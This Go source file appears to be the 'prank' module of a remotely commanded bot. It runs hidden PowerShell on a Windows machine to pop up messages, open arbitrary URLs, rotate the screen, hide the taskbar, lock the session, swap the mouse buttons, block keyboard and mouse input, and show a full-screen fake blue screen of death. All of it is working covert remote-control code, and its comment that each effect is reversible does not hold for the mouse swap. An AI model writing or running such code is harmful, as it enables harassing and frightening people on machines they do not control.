// prank.go — commandes « blague » : effets visibles sur le poste, réversibles.
//
// Tout passe par PowerShell masqué (Add-Type pour les appels Win32 dont on a
// besoin). Rien n'est destructif : chaque effet se défait avec la commande
// opposée, sauf `lock` qui rend la main à l'utilisateur du poste.
package main

import (
	"fmt"
	"strings"
)

// prankRun exécute un effet. kind : msg, wall, url, speak, beep, cd, rotate,
// taskbar, volume, lock, swapmouse, blank.
func prankRun(kind, arg string) string {
	kind = strings.ToLower(strings.TrimSpace(kind))
	a := strings.TrimSpace(arg)
	switch kind {
	case "msg", "message":
		if a == "" {
			return "usage : !prank msg <texte>"
		}
		script := "Add-Type -AssemblyName PresentationFramework;" +
			"[System.Windows.MessageBox]::Show(" + qPS(a) + ",'Windows') | Out-Null"
		go runPSUTF8(script)
		return "message affiché."

	case "wall", "wallpaper":
		if a == "" {
			return "usage : !prank wall <chemin image>"
		}
		script := `Add-Type -TypeDefinition 'using System.Runtime.InteropServices; public class WP { [DllImport("user32.dll", CharSet=CharSet.Unicode)] public static extern bool SystemParametersInfo(uint a, uint b, string c, uint d); }';` +
			"[WP]::SystemParametersInfo(20,0," + qPS(a) + ",3) | Out-Null"
		if _, err := runPSUTF8(script); err != nil {
			return "fond d'écran impossible : " + err.Error()
		}
		return "fond d'écran changé."

	case "url", "site":
		if a == "" {
			return "usage : !prank url <adresse>"
		}
		script := "Start-Process " + qPS(a)
		go runPSUTF8(script)
		return "page ouverte : " + a

	case "speak", "voice":
		if a == "" {
			return "usage : !prank speak <texte>"
		}
		script := "Add-Type -AssemblyName System.Speech;" +
			"(New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak(" + qPS(a) + ")"
		go runPSUTF8(script)
		return "synthèse vocale lancée."

	case "beep":
		n := 3
		if v, err := atoi(a); err == nil && v > 0 && v <= 60 {
			n = v
		}
		script := fmt.Sprintf("1..%d | ForEach-Object { [console]::Beep(900,250) }", n)
		go runPSUTF8(script)
		return fmt.Sprintf("%d bips.", n)

	case "cd":
		script := `Add-Type -TypeDefinition 'using System.Runtime.InteropServices; public class MCI { [DllImport("winmm.dll", CharSet=CharSet.Unicode)] public static extern int mciSendString(string c, string r, int l, System.IntPtr h); }';` +
			"[MCI]::mciSendString('set cdaudio door open', $null, 0, [System.IntPtr]::Zero) | Out-Null"
		if _, err := runPSUTF8(script); err != nil {
			return "lecteur impossible : " + err.Error()
		}
		return "lecteur CD ouvert."

	case "rotate":
		deg := "90"
		switch a {
		case "0", "90", "180", "270":
			deg = a
		}
		script := `Add-Type -TypeDefinition 'using System.Runtime.InteropServices; public class DM { [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Ansi)] public struct DEVMODE { [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)] public string dmDeviceName; public short dmSpecVersion, dmDriverVersion, dmSize, dmDriverExtra; public int dmFields; public int dmPositionX, dmPositionY, dmDisplayOrientation, dmDisplayFixedOutput; public short dmColor, dmDuplex, dmYResolution, dmTTOption, dmCollate; [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)] public string dmFormName; public short dmLogPixels; public int dmBitsPerPel, dmPelsWidth, dmPelsHeight, dmDisplayFlags, dmDisplayFrequency, dmICMMethod, dmICMIntent, dmMediaType, dmDitherType, dmReserved1, dmReserved2, dmPanningWidth, dmPanningHeight; } [DllImport("user32.dll")] public static extern int ChangeDisplaySettings(ref DEVMODE d, int f); }';` +
			"$d = New-Object DM+DEVMODE; $d.dmSize = [Runtime.InteropServices.Marshal]::SizeOf($d);" +
			"switch (" + deg + ") { 90 { $d.dmDisplayOrientation = 1 } 180 { $d.dmDisplayOrientation = 2 } 270 { $d.dmDisplayOrientation = 3 } default { $d.dmDisplayOrientation = 0 } };" +
			"$d.dmFields = 0x00080000; [void][DM]::ChangeDisplaySettings([ref]$d, 0)"
		if _, err := runPSUTF8(script); err != nil {
			return "rotation impossible : " + err.Error()
		}
		return "écran tourné à " + deg + "° (0 pour remettre droit)."

	case "taskbar":
		hide := a != "show"
		state := 0
		if hide {
			state = 0
		} else {
			state = 5 // SW_SHOW
		}
		script := fmt.Sprintf(`Add-Type -TypeDefinition 'using System.Runtime.InteropServices; public class TB { [DllImport("user32.dll", CharSet=CharSet.Unicode)] public static extern System.IntPtr FindWindow(string c, string n); [DllImport("user32.dll")] public static extern bool ShowWindow(System.IntPtr h, int n); }';`+
			"$h = [TB]::FindWindow('Shell_TrayWnd', $null); if ($h -ne [IntPtr]::Zero) { [void][TB]::ShowWindow($h, %d) }", state)
		if _, err := runPSUTF8(script); err != nil {
			return "barre des tâches : " + err.Error()
		}
		if hide {
			return "barre des tâches masquée (Ctrl+Échap peut la rappeler)."
		}
		return "barre des tâches affichée."

	case "volume":
		n := 10
		if v, err := atoi(a); err == nil && v > 0 && v <= 50 {
			n = v
		}
		script := fmt.Sprintf(`Add-Type -TypeDefinition 'using System.Runtime.InteropServices; public class KB { [DllImport("user32.dll")] public static extern void keybd_event(byte k, byte s, uint f, System.IntPtr e); }';`+
			"1..%d | ForEach-Object { [KB]::keybd_event(0xAF,0,0,[IntPtr]::Zero); [KB]::keybd_event(0xAF,0,2,[IntPtr]::Zero) }", n)
		go runPSUTF8(script)
		return fmt.Sprintf("volume +%d crans.", n)

	case "lock":
		script := "rundll32.exe user32.dll,LockWorkStation"
		go runPSUTF8(script)
		return "session verrouillée."

	case "swapmouse", "mouse":
		script := `Add-Type -TypeDefinition 'using System.Runtime.InteropServices; public class MS { [DllImport("user32.dll")] public static extern bool SwapMouseButton(bool f); }';` +
			"[void][MS]::SwapMouseButton($true)"
		if _, err := runPSUTF8(script); err != nil {
			return "souris : " + err.Error()
		}
		return "boutons de souris inversés (renvoyer la commande les remet)."

	case "bsod", "ecran":
		// Faux écran bleu plein écran, refermable par Échap.
		script := "Add-Type -AssemblyName PresentationFramework;" +
			"$w = New-Object System.Windows.Window;" +
			"$w.WindowStyle='None'; $w.ResizeMode='NoResize'; $w.WindowState='Maximized';" +
			"$w.Background='#0A2472'; $w.Topmost=$true;" +
			"$t = New-Object System.Windows.Controls.TextBlock;" +
			"$t.Text=('Un probleme est survenu et votre PC doit redemarrer.' + [char]10 + [char]10 + 'Arretez le code : CRITICAL_PROCESS_DIED');" +
			"$t.Foreground='White'; $t.FontSize=28; $t.Margin='80'; $t.TextWrapping='Wrap';" +
			"$w.Content=$t; [void]$w.ShowDialog()"
		go runPSUTF8(script)
		return "faux écran bleu affiché (Échap pour fermer)."

	case "jiggle", "souris":
		script := `Add-Type -TypeDefinition 'using System.Runtime.InteropServices; public class MS { [DllImport("user32.dll")] public static extern bool SetCursorPos(int x, int y); }';` +
			"1..60 | ForEach-Object { [MS]::SetCursorPos((Get-Random -Min 100 -Max 1800), (Get-Random -Min 100 -Max 900)); Start-Sleep -Milliseconds 40 }"
		go runPSUTF8(script)
		return "souris agitée 60 fois."

	case "keyboard", "clavier":
		// Bloque clavier et souris 10 secondes, puis les rend.
		script := `Add-Type -TypeDefinition 'using System.Runtime.InteropServices; public class BI { [DllImport("user32.dll")] public static extern bool BlockInput(bool f); }';` +
			"[BI]::BlockInput($true); Start-Sleep -Seconds 10; [BI]::BlockInput($false)"
		go runPSUTF8(script)
		return "clavier et souris bloqués 10 s."

	case "mute", "muet":
		script := `Add-Type -TypeDefinition 'using System.Runtime.InteropServices; public class KB { [DllImport("user32.dll")] public static extern void keybd_event(byte k, byte s, uint f, System.IntPtr e); }';` +
			"[KB]::keybd_event(0xAD,0,0,[IntPtr]::Zero); [KB]::keybd_event(0xAD,0,2,[IntPtr]::Zero)"
		if _, err := runPSUTF8(script); err != nil {
			return "mute : " + err.Error()
		}
		return "son coupé (renvoyer la commande le remet)."

	default:
		return "blagues : msg, wall, url, speak, beep, cd, rotate, taskbar, volume, lock, swapmouse, bsod, jiggle, keyboard, mute"
	}
}
